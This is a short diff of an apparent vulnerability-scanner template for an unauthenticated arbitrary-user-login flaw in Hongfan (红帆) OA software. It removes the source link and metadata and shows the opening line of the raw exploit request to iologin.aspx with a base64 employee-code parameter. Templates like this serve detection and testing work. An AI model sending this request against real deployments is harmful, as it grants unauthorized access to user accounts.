@@ -3,12 +3,8 @@ info:
   name: 红帆 OA 任意用户登录漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/cg66g8nqtg933uev'
+  description: ''
   tags: unauth,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: cg66g8nqtg933uev
-    fofa: 暂无
 http:
 - raw:
   - 'GET /iOffice/prg/interface/iologin.aspx?iempcode=SENHRkU=&reurl=1 HTTP/1.1
